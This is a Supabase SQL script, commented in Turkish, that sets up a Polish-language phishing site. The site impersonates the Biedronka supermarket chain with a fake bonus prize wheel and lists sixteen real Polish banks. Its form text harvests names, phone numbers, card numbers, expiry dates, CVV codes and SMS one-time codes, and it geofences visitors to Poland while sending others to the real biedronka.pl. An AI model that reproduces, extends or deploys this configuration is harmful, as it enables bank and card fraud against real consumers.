-- ===========================================================================
-- BIEDRONKA PL — AYAR ONARIMI (mevcut DB uzerine guvenle calistirilir)
-- Eski/Tesco degerlerini Biedronka + Lehce + PLN + kirmizi palete zorlar.
-- Tablo olusturmaz, sadece gunceller/upsert eder.
-- Supabase SQL Editor'e yapistir -> Run.
-- ===========================================================================

-- 1) GLOBAL SETTINGS: metinler + dil + wheel ayarlari (tema + oduller)
update public.global_settings set
  logo_url                    = '/form-assets/biedronka-mini-logo.webp',
  bg_url                      = '/form-assets/bg-desktop.webp',
  portal_name                 = 'Portal Klienta Biedronka',
  support_center_name         = 'Obsługa Klienta Biedronka',
  win_title                   = 'Ekskluzywny Bonus Biedronka',
  win_subtitle                = 'Gratulacje! Zostałeś wybrany do dzisiejszej promocji Biedronka. Kliknij przycisk poniżej, aby odebrać swój bonus.',
  win_button                  = 'Odbierz bonus',
  banken_title                = 'Wybierz swój bank',
  banken_subtitle             = 'Wybierz swój bank, aby kontynuować.',
  banken_search_placeholder   = 'Szukaj swojego banku...',
  wait_title                  = 'Proszę czekać',
  wait_subtitle               = 'Twoje żądanie jest bezpiecznie przetwarzane...',
  sms_title                   = 'Kod bezpieczeństwa SMS',
  sms_subtitle                = 'Wprowadź {digits}-cyfrowy kod.',
  sms_input_label             = 'Jednorazowy kod',
  sms_button                  = 'Potwierdź',
  sms_loading                 = 'Przetwarzanie...',
  card_title                  = 'Dane do płatności',
  card_subtitle               = 'Sprawdź i potwierdź swoje dane.',
  card_owner_label            = 'Imię i nazwisko posiadacza karty',
  card_number_label           = 'Numer karty',
  card_expiry_label           = 'Data ważności MM/RR',
  card_cvv_label              = 'Kod bezpieczeństwa',
  card_button                 = 'Kontynuuj',
  code_title                  = 'Witamy',
  code_subtitle               = 'Wprowadź kod uczestnictwa otrzymany od {partner}, aby odblokować nagrodę.',
  code_button                 = 'Potwierdź kod',
  live_support_title          = 'Wsparcie na żywo',
  live_support_subtitle       = 'Aby kontynuować, skontaktuj się z naszą obsługą klienta.' || chr(10) || chr(10) || 'Kliknij przycisk poniżej, aby rozpocząć czat.',
  live_support_button         = 'Rozpocznij czat',
  profile_title_small         = 'Potwierdzenie nagrody',
  profile_title_main          = 'Twoja kwota bonusu',
  profile_subtitle            = 'Potwierdź swoje dane do dalszego przetwarzania.',
  profile_firstname_label     = 'Imię',
  profile_lastname_label      = 'Nazwisko',
  profile_phone_label         = 'Numer telefonu',
  profile_button              = 'Dalej',
  profile_loading_text        = 'Przetwarzanie...',
  site_language               = 'pl',
  target_country              = 'Polonya',
  entry_page                  = '/win',
  site_enabled                = true,
  wheel_settings              = '{
    "campaign_name": "Biedronka",
    "geo_redirect_url": "https://www.biedronka.pl",
    "theme_primary": "#dd1a21",
    "allowed_countries": ["PL"],
    "prizes": [
      {"amount": 3500, "weight": 10},
      {"amount": 3000, "weight": 25},
      {"amount": 2500, "weight": 30},
      {"amount": 2000, "weight": 35}
    ]
  }'::jsonb
where id = 'default';

-- 2) POLONYA BANKALARI: 16 banka aktif, dogru logo + renkler
insert into public.banks (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, auto_redirect, sort_order, design_config) values
  ('pekao24',    'Bank Pekao (PeoPay)',       'Polonya', '/bank-logos/poland/pekao24.webp',   '#e31e24', '#b3181d', 'pekao24.pl',       true, false, 10,  '{}'),
  ('ing',        'ING Bank Śląski',           'Polonya', '/bank-logos/poland/ing.webp',       '#ff6200', '#cc4e00', 'ing.pl',           true, false, 20,  '{}'),
  ('bnpparibas', 'BNP Paribas',               'Polonya', '/bank-logos/poland/bnpparibas.webp','#008766', '#006850', 'bnpparibas.pl',    true, false, 30,  '{}'),
  ('millennium', 'Bank Millennium',           'Polonya', '/bank-logos/poland/millennium.webp','#e2004f', '#b3003f', 'bankmillennium.pl',true, false, 40,  '{}'),
  ('alior',      'Alior Bank',                'Polonya', '/bank-logos/poland/alior.webp',     '#e10064', '#b30050', 'aliorbank.pl',     true, false, 50,  '{}'),
  ('velobank',   'VeloBank',                  'Polonya', '/bank-logos/poland/velobank.webp',  '#00a650', '#008040', 'velobank.pl',      true, false, 60,  '{}'),
  ('santander',  'Santander',                 'Polonya', '/bank-logos/poland/santander.svg',  '#ec0000', '#bd0000', 'santander.pl',     true, false, 70,  '{}'),
  ('mbank',      'mBank',                     'Polonya', '/bank-logos/poland/mbank.webp',     '#d9222a', '#b01b22', 'mbank.pl',         true, false, 80,  '{}'),
  ('ipko',       'iPKO (PKO BP)',             'Polonya', '/bank-logos/poland/ipko.webp',      '#0051ba', '#003e94', 'ipko.pl',          true, false, 90,  '{}'),
  ('ca24',       'Crédit Agricole (CA24)',    'Polonya', '/bank-logos/poland/ca24.webp',      '#006f4e', '#00583e', 'ca24.pl',          true, false, 100, '{}'),
  ('citibank',   'Citi Handlowy',             'Polonya', '/bank-logos/poland/citibank.svg',   '#056dae', '#04578b', 'citibank.pl',      true, false, 110, '{}'),
  ('pocztowy',   'Bank Pocztowy',             'Polonya', '/bank-logos/poland/pocztowy.webp',  '#ffc000', '#cc9a00', 'pocztowy.pl',      true, false, 120, '{}'),
  ('sgb',        'Bank Spółdzielczy (SGB)',   'Polonya', '/bank-logos/poland/sgb.webp',       '#008a44', '#006e36', 'sgb.pl',           true, false, 130, '{}'),
  ('bps',        'Bank BPS',                  'Polonya', '/bank-logos/poland/bps.webp',       '#0054a6', '#004385', 'bps.pl',           true, false, 140, '{}'),
  ('bosbank',    'BOŚ Bank',                  'Polonya', '/bank-logos/poland/bosbank.webp',   '#009a44', '#007b36', 'bosbank.pl',       true, false, 150, '{}'),
  ('bsr-krakow', 'BS Rzeszów / Kraków',       'Polonya', '/bank-logos/poland/bsr-krakow.svg', '#1a5ea6', '#154b85', 'bsr.pl',           true, false, 160, '{}')
on conflict (slug) do update set
  name          = excluded.name,
  country       = excluded.country,
  logo_file     = excluded.logo_file,
  brand_color   = excluded.brand_color,
  accent_color  = excluded.accent_color,
  domain        = excluded.domain,
  is_active     = excluded.is_active,
  sort_order    = excluded.sort_order;

-- 3) POLONYA DISI bankalar: admin'de gorunur ama public'te pasif
update public.banks set is_active = false where country <> 'Polonya';

-- DOGRULAMA: asagidaki sorgular dogru degerleri dondurmeli
-- select portal_name, site_language, target_country, wheel_settings->'theme_primary' as tema, wheel_settings->'prizes' as oduller from public.global_settings;
-- select slug, is_active from public.banks order by sort_order;
